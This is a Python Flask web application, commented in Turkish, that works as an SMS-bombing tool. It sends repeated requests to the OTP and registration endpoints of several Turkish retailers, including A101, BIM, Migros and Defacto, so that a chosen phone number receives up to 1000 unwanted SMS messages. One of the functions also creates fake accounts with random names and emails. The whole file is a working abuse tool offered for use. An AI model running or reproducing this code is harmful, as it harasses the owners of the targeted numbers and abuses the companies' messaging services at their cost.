from flask import Flask, render_template, request
import random
import time
import requests
import json
import uuid
import string

app = Flask(__name__)

# 📌 API Fonksiyonları
def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {"phone": f"0{number}"}
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {"phone": f"90{number}"}
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200, "BIM"
    except:
        return False, "BIM"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {"mobilePhone": f"0{number}"}
        r = requests.post(url, json=payload, timeout=5)
        return r.json().get("Data") == "IsSMSSend", "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query": "mutation SendOtp2($phoneNumber: String!) { sendOtp2(phoneNumber: $phoneNumber) { alreadySent remainingTime } }",
            "variables": {"phoneNumber": f"90{number}"}
        }
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200, "İsteGelsin"
    except:
        return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "name": f"{''.join(random.choices(string.ascii_letters, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url, json=payload, timeout=5)
        return r.json().get("isSucceed") == True, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url, json=payload, timeout=5)
        return r.json().get("successful") == True, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {"mobile_number": f"{number}", "token_type": "register_token"}
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200, "Cepte Şok"
    except:
        return False, "Cepte Şok"

# 📌 Kullanılacak API'ler listesi
services = [a101, bim, defacto, istegelsin, ikinciyeni, migros, ceptesok]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_sms', methods=['POST'])
def send_sms():
    number = request.form.get("number")
    amount = int(request.form.get("amount"))

    # 📌 Maksimum 1000 SMS gönderim sınırı
    if amount > 1000:
        amount = 1000

    results = []
    
    for _ in range(amount):
        service = random.choice(services)
        success, name = service(number)
        results.append({"service": name, "success": success})
    
    return render_template('result.html', number=number, results=results)

import os

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
